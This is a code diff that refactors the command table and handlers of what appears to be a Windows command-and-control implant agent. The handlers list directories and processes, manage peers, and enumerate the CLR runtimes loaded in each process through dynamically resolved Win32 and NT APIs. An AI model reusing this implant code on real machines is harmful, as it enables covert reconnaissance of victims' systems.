@@ -7,13 +7,13 @@ using namespace Dispatcher;
 namespace Commands {
 
   __attribute__((used, section(".rdata"))) HASH_MAP cmd_map[] = {
-        { .name = DIRECTORYLIST, 	.address = Commands::DirectoryList        },
-        { .name = PROCESSMODULES,	.address = Commands::ProcessModules       },
-        { .name = PROCESSLIST,		.address = Commands::ProcessList          },
-        { .name = ADDPEER,			.address = Commands::CommandAddPeer       },
-        { .name = REMOVEPEER,		.address = Commands::CommandRemovePeer    },
-        { .name = SHUTDOWN,			.address = Commands::Shutdown             },
-        { .name = 0,				.address = nullptr		                  },
+        { .name = DIRECTORYLIST, 	.address = (void(*)(_parser*)) Commands::DirectoryList        },
+        { .name = PROCESSMODULES,	.address = (void(*)(_parser*)) Commands::ProcessModules       },
+        { .name = PROCESSLIST,		.address = (void(*)(_parser*)) Commands::ProcessList          },
+        { .name = ADDPEER,			.address = (void(*)(_parser*)) Commands::CommandAddPeer       },
+        { .name = REMOVEPEER,		.address = (void(*)(_parser*)) Commands::CommandRemovePeer    },
+        { .name = SHUTDOWN,			.address = (void(*)(_parser*)) Commands::Shutdown             },
+        { .name = 0,				.address = nullptr		                                      },
     };
 
     VOID DirectoryList (_parser *parser) {
@@ -33,7 +33,7 @@ namespace Commands {
         const auto path_buffer    = (char*) Malloc(MAX_PATH);
 
         if (dir_string[0] == PERIOD) {
-            if (!(size = ctx->ioapi.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
+            if (!(size = ctx->win32.GetCurrentDirectoryA(MAX_PATH, path_buffer))) {
                 // LOG ERROR
                 goto defer;
             }
@@ -162,8 +162,8 @@ namespace Commands {
         size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
 
-        x_assert(snapshot = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
-        x_assert(ctx->enumapi.Process32First(snapshot, &entries));
+        x_assert(snapshot = ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+        x_assert(ctx->win32.Process32First(snapshot, &entries));
 
         do {
             CLIENT_ID cid       = { };
@@ -176,8 +176,8 @@ namespace Commands {
             OBJECT_ATTRIBUTES attr = { };
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
 
-            x_ntassert(ctx->procapi.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
-            x_ntassert(ctx->enumapi.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
+            x_ntassert(ctx->win32.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
+            x_ntassert(ctx->win32.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
             x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));
 
             while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
@@ -200,7 +200,7 @@ namespace Commands {
             }
 
             if (process) {
-                ctx->utilapi.NtClose(process);
+                ctx->win32.NtClose(process);
             }
             if (meta) {
                 meta->lpVtbl->Release(meta);
@@ -212,13 +212,14 @@ namespace Commands {
                 enums->Release();
             }
         }
-        while (ctx->enumapi.Process32Next(snapshot, &entries));
+
+        while (ctx->win32.Process32Next(snapshot, &entries));
 
         MessageQueue(out);
 
         defer:
         if (snapshot) {
-            ctx->utilapi.NtClose(snapshot);
+            ctx->win32.NtClose(snapshot);
         }
     }
 
